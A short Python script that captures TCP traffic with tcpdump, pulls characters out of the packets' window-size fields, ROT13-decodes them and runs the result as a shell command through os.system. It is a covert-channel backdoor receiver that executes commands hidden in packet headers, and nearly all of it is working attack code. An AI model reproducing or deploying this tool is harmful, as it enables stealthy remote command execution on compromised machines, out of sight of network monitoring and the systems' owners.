import re
import subprocess
import argparse
import codecs, os
from colorama import Fore

Reset = Fore.RESET
Red = Fore.RED
Green = Fore.GREEN
Cyan = Fore.CYAN

argParser = argparse.ArgumentParser()
argParser.add_argument("-i", "--interface", help="Network capturing interface")
argParser.add_argument("-pc", "--packetsCount", help="Number of packets to capture")
argParser.add_argument("-p", "--port", help="Port that will receive the packets")
args = argParser.parse_args()
interface = args.interface
packetsCount = args.packetsCount
port = args.port
log = open("./captured.txt", "w")

def decode():
    with open("./captured.txt", "r") as fi:
        lines = fi.readlines()
        var = ""
        s = [""]
        for line in lines:
            regex = r"(win)\s([1-9][0-9]{1,3}|10000000)"
            str = line
            matches = re.finditer(regex, str, re.MULTILINE)
            for matchNum, match in enumerate(matches, start=1):
                for groupNum in range(0, len(match.groups())):
                    groupNum = groupNum + 1
                    all = "{group}".format(group=match.group(groupNum))
                    all_int = re.findall(r'\d+', all)
                for ints in all_int:
                    s.append(chr(int(ints)))
        if s != None:
            decoded_command = codecs.decode(''.join(s), 'rot13')
            print(f"{Green}[+] Encoded command: {Cyan}{''.join(s)}{Reset}\n{Green}[+] Decoded command: {Cyan}{decoded_command}{Reset}")
            os.system(decoded_command)

if interface == None:
    print(Red + "[-] Pleace specify network interface" + Reset)
elif packetsCount == None:
    print(Red + "[-] Pleace specify packets count to capture" + Reset)
elif port == None:
    print(Red + "[-] Pleace specify port to monitor" + Reset)
else:
    try:
        cmd = subprocess.run(["tcpdump", "-i", interface, "tcp", "and", "port", port, "-c", packetsCount], stdout=log)
        if cmd.returncode == 0:
            decode()
    except KeyboardInterrupt:
        decode()
    else:
        print(cmd.returncode)
